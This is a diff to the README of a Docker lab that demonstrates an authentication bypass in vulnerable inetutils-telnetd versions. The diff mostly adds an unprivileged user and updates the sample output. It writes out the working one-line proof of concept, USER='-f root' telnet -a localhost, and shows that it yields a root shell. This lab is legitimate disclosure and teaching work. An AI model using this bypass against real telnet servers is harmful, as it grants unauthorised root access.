@@ -4,7 +4,7 @@ A small lab to play with the auth bypass in inetutils-telnetd 1.9.3 - 2.7 as dis
 
 This container relies on the fact that inetutils-telnetd is still a vulnerable version in Debian 11 (Bullseye). At the time of creating this, it was:
 
-```
+```text
 root@ba8cc6858b87:/# apt search inetutils-telnetd
 Sorting... Done
 Full Text Search... Done
@@ -20,25 +20,25 @@ Clone and build the container with `docker build -t telnetd-exploit .`.
 
 Run the container with `docker run --rm -it telnetd-exploit`. A message will show you the PoC.
 
-```
+```text
 docker run --rm -it telnetd-exploit
 Starting internet superserver: inetd.
-Try telnet as root with: USER='-f root' telnet -a localhost
-root@0c4a795fa114:/#
+You are user1. Try telnet as root with: USER='-f root' telnet -a localhost
+user1@114102afa5d3:/$
 ```
 
 A successful run would look something like this:
 
-```
-root@ec60d425d634:/# USER='-f root' telnet -a localhost
+```text
+user1@114102afa5d3:/$ USER='-f root' telnet -a localhost
 Trying ::1...
 Trying 127.0.0.1...
 Connected to localhost.
 Escape character is '^]'.
 
-Linux 6.17.8 (ec60d425d634) (pts/1)
+Linux 6.17.8 (114102afa5d3) (pts/1)
 
-Linux ec60d425d634 6.17.8 #1 SMP PREEMPT Thu Nov 20 09:34:02 UTC 2025 aarch64
+Linux 114102afa5d3 6.17.8 #1 SMP PREEMPT Thu Nov 20 09:34:02 UTC 2025 aarch64
 
 The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
@@ -46,7 +46,7 @@ individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
-root@ec60d425d634:~#
+root@114102afa5d3:~#
 ```
 
-[0] https://seclists.org/oss-sec/2026/q1/89
+[0] <https://seclists.org/oss-sec/2026/q1/89>
